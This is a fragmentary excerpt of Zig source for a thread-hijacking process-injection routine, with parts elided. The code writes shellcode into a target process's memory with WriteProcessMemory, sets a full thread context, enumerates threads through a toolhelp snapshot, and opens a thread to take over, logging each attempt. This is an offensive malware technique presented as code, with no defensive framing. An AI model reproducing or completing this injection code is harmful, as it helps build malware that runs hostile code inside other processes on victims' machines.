...
pub fn threadHijacking(
    ...
    threadContext.ContextFlags = win.CONTEXT_FULL;
    ...
    _ = win.WriteProcessMemory(targetProcess, remoteBuffer, &shellcode, shellcode.len, null);
    ...
    if (snapshot == win.standard.INVALID_HANDLE_VALUE) {
        logger.err("\t[!] CreateToolhelp32Snapshot Failed With Error: {any}\n", .{win.standard.GetLastError()});
        return;
    }
    ...
    for (candidate_threads[0..candidate_count]) |thread_id| {
        ...
        if (threadHijacked != null) {
            logger.info("\t[i] Successfully opened thread {d}\n", .{thread_id});
            break;
        } else {
            logger.err("\t[!] Failed to open thread {d} with error: {any}\n", .{ thread_id, win.standard.GetLastError() });
        }
    }
